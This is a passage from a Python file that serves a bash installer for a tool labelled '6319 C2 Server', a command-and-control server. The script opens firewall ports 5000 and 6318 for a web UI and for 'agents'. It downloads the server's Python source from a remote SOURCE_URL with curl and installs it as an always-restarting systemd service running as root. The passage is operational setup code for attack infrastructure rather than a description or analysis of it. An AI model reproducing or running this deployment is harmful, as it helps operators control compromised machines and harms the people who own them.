install_deps_debian() {{
    info "Installing dependencies (apt)..."
    apt-get update -qq
    apt-get install -y -qq python3 python3-pip python3-venv curl >/dev/null 2>&1
}}

install_deps_rhel() {{
    info "Installing dependencies (yum/dnf)..."
    if command -v dnf &>/dev/null; then
        dnf install -y python3 python3-pip curl >/dev/null 2>&1
    else
        yum install -y python3 python3-pip curl >/dev/null 2>&1
    fi
}}

install_deps() {{
    case "$OS" in
        ubuntu|debian|kali|mint|pop) install_deps_debian ;;
        rhel|centos|fedora|rocky|alma) install_deps_rhel ;;
        arch|manjaro) pacman -Sy --noconfirm python python-pip curl >/dev/null 2>&1 ;;
        alpine) apk add --no-cache python3 py3-pip curl >/dev/null 2>&1 ;;
        *) warn "Unknown OS, trying apt..."; install_deps_debian ;;
    esac
}}

setup_firewall() {{
    info "Configuring firewall..."
    if command -v ufw &>/dev/null; then
        ufw allow 5000/tcp >/dev/null 2>&1 || true
        ufw allow 6318/tcp >/dev/null 2>&1 || true
    elif command -v firewall-cmd &>/dev/null; then
        firewall-cmd --permanent --add-port=5000/tcp >/dev/null 2>&1 || true
        firewall-cmd --permanent --add-port=6318/tcp >/dev/null 2>&1 || true
        firewall-cmd --reload >/dev/null 2>&1 || true
    elif command -v iptables &>/dev/null; then
        iptables -I INPUT -p tcp --dport 5000 -j ACCEPT 2>/dev/null || true
        iptables -I INPUT -p tcp --dport 6318 -j ACCEPT 2>/dev/null || true
    fi
}}

detect_os
install_deps

if systemctl is-active --quiet ${{SERVICE_NAME}} 2>/dev/null; then
    info "Stopping existing service..."
    systemctl stop ${{SERVICE_NAME}}
fi

info "Creating installation directory..."
mkdir -p "$INSTALL_DIR/templates" "$INSTALL_DIR/static"
cd "$INSTALL_DIR"

info "Downloading source files from $SOURCE_URL..."
curl -fsSL "$SOURCE_URL/raw/server.py" -o server.py || err "Failed to download server.py"
curl -fsSL "$SOURCE_URL/raw/crypto.py" -o crypto.py || err "Failed to download crypto.py"
curl -fsSL "$SOURCE_URL/raw/webhooks.py" -o webhooks.py || err "Failed to download webhooks.py"
curl -fsSL "$SOURCE_URL/raw/index.html" -o templates/index.html || err "Failed to download index.html"
curl -fsSL "$SOURCE_URL/raw/style.css" -o static/style.css || err "Failed to download style.css"
info "All files downloaded successfully"

if [ ! -d "venv" ]; then
    info "Creating Python virtual environment..."
    python3 -m venv venv
fi
source venv/bin/activate

info "Installing Python packages..."
pip install --upgrade pip -q
pip install flask flask-socketio pynacl gevent gevent-websocket -q

setup_firewall

info "Creating systemd service..."
cat > /etc/systemd/system/${{SERVICE_NAME}}.service << SVCEOF
[Unit]
Description=6319 C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
Environment="PATH=$INSTALL_DIR/venv/bin:/usr/local/bin:/usr/bin:/bin"
ExecStart=$INSTALL_DIR/venv/bin/python server.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
SVCEOF

systemctl daemon-reload
systemctl enable ${{SERVICE_NAME}} >/dev/null 2>&1
systemctl start ${{SERVICE_NAME}}

sleep 2
if systemctl is-active --quiet ${{SERVICE_NAME}}; then
    info "Service started successfully!"
    echo ""
    echo -e "${{C}}============================================${{N}}"
    echo -e "${{G}}6319 C2 Server is running${{N}}"
    echo -e "  Web UI: ${{Y}}http://$(hostname -I | awk '{{print $1}}'):5000${{N}}"
    echo -e "  Agents: ${{Y}}port 6318${{N}}"
    echo -e "${{C}}============================================${{N}}"
else
    err "Service failed to start. Check: journalctl -u ${{SERVICE_NAME}}"
fi
'''
    return Response(script, mimetype='text/plain')


if __name__ == '__main__':
    main()
